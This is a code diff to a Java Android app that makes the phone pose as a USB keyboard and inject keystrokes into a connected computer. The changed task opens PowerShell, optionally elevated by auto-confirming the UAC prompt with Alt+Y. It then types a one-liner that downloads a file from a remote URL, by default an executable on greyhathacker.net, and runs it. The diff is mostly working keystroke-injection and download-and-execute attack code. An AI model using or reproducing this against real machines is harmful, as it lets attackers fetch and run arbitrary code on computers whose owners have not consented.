@@ -11,9 +11,9 @@ import static cf.netdex.hidfuzzer.hid.Input.KB;
  * Created by netdex on 1/17/2017.
  */
 
-public class DownloadTask extends HIDTask {
-    public DownloadTask(Context context) {
-        super(context, "Downloads and executes a given file. Requires admin account.");
+public class DownloadRunTask extends HIDTask {
+    public DownloadRunTask(Context context) {
+        super(context, "Downloads and executes a given file as local user.");
     }
 
     @Override
@@ -25,6 +25,8 @@ public class DownloadTask extends HIDTask {
 
         String file = ask("File to download?", "http://www.greyhathacker.net/tools/messbox.exe");
 
+        boolean runAs = should("Task UAC", "Launch exec. as admin?");
+
         while (!isCancelled()) {
             publishProgress(RunState.IDLE);
             // poll until /dev/hidg0 is writable
@@ -35,15 +37,28 @@ public class DownloadTask extends HIDTask {
             publishProgress(RunState.RUNNING);
 
             h.delay(1000);
-            h.press_keys(KB.M.LSUPER.c, KB.K.D.c);
-            h.delay(500);
-            h.press_keys(KB.M.LSUPER.c, KB.K.R.c);
-            h.delay(2000);
-            h.send_string("powershell Start-Process powershell -Verb runAs\n");
-            h.delay(2000);
-            h.press_keys(KB.M.LALT.c, KB.K.Y.c);
 
-            h.delay(2000);
+
+            log("opening powershell, runAs=" + runAs);
+            if (runAs) {
+                // when running elevated prompt sometimes it pops in background, so we need
+                // to go to the desktop
+                h.press_keys(KB.M.LSUPER.c, KB.K.D.c);
+                h.delay(500);
+                h.press_keys(KB.M.LSUPER.c, KB.K.R.c);
+                h.delay(2000);
+                h.send_string("powershell Start-Process powershell -Verb runAs\n");
+                h.delay(2000);
+                h.press_keys(KB.M.LALT.c, KB.K.Y.c);
+                h.delay(2000);
+            } else {
+                h.press_keys(KB.M.LSUPER.c, KB.K.R.c);
+                h.delay(2000);
+                h.send_string("powershell\n");
+                h.delay(2000);
+            }
+
+            log("download + execute code");
             h.send_string(
                     "$d=New-Object System.Net.WebClient;" +
                             "$u='" + file + "';" +
@@ -51,8 +66,6 @@ public class DownloadTask extends HIDTask {
                             "$e=New-Object -com shell.application;" +
                             "$e.shellexecute($f);" +
                             "exit;\n");
-            h.delay(500);
-            h.press_keys(KB.M.LSUPER.c, KB.K.D.c);
 
             publishProgress(RunState.DONE);
             while (!isCancelled() && h.test() == 0) {
